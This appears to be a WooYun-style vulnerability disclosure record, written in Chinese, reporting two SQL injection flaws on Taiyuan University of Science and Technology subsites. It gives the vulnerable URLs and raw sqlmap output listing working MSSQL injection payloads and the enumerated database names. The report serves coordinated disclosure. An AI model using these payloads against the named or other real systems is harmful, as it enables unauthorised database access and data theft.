wybug_title: 太原科技大学某些分站存在两处SQL注入
wybug_status: 已交由第三方合作机构(CCERT教育网应急响应组)处理
wybug_detail:
漏洞详情 披露状态：   									2014-06-17：	细节已通知厂商并且等待厂商处理中									2014-06-19：	厂商已经确认，细节仅向厂商公开									2014-06-29：	细节向核心白帽子及相关领域专家公开									2014-07-09：	细节向普通白帽子公开									2014-07-19：	细节向实习白帽子公开									2014-08-01：	细节向公众公开  简要描述： 太原科技大学某些分站存在两处SQL注入 详细说明：  第一处：http://210.31.104.8/display.php?ii_id=1073sqlmap：

第二处：http://210.31.104.59/pub/search/default.asp?id=10sqlmap：
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=10 AND 1300=1300    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: id=10 AND 3976=CONVERT(INT,(SELECT CHAR(113)+CHAR(120)+CHAR(114)+CHAR(114)+CHAR(113)+(SELECT (CASE WHEN (3976=3976) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(99)+CHAR(108)+CHAR(112)+CHAR(113)))    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: id=10; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=10 WAITFOR DELAY '0:0:5'--    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: id=(SELECT CHAR(113)+CHAR(120)+CHAR(114)+CHAR(114)+CHAR(113)+(SELECT (CASE WHEN (8756=8756) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(99)+CHAR(108)+CHAR(112)+CHAR(113))---[00:52:09] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[00:52:09] [INFO] fetching database names[00:52:09] [INFO] the SQL query used returns 8 entries[00:52:09] [INFO] resumed: master[00:52:09] [INFO] resumed: model[00:52:09] [INFO] resumed: msdb[00:52:09] [INFO] resumed: Northwind[00:52:09] [INFO] resumed: pubs[00:52:09] [INFO] resumed: serverdb[00:52:09] [INFO] resumed: serverdbbk[00:52:09] [INFO] resumed: tempdbavailable databases [8]:[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] serverdb[*] serverdbbk[*] tempdb[00:52:09] [INFO] fetched data logged to text files under 'C:\Python27\sqlmap\output\210.31.104.59'
